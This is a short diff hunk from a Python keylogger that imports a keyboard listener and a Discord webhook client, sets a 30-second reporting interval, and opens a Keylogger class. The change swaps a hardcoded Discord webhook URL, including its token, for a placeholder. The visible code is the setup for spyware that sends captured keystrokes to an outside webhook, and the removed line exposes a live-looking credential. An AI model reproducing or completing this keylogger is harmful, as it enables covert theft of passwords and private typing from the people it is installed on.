@@ -2,7 +2,7 @@ from dhooks import Webhook
 from threading import Timer
 from pynput.keyboard import Listener
 
-WEBHOOK_URL = 'https://discord.com/api/webhooks/1233859673384292504/LogDxEwHLphfifEHd_Lj2a8To5iVOLXSTi89brJl-QkEMk4hS6gtH8hNYRKKpMYth0EF'
+WEBHOOK_URL = 'YOUR_WEBHOOK_URL_HERE' #put your webhook url here
 TIME_INTERVAL = 30  # Amount of time between each report, expressed in seconds.
 
 class Keylogger:
